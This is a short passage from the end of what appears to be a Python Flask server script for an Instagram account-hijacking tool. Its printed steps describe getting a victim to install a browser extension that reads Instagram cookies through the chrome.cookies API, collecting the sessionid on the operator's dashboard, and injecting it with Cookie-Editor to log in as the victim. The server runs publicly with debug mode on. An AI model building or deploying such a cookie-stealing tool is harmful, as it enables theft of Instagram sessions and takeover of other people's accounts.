    print(f"     3. Installs in Kiwi Browser (Android) or Chrome (PC)")
    print(f"     4. Extension reads Instagram cookies using chrome.cookies API")
    print(f"     5. sessionid appears on your dashboard!")
    print(f"     6. Copy it → inject into Cookie-Editor → logged in as them!")
    print(f"{'='*60}\n")
    app.run(host="0.0.0.0", port=port, debug=True)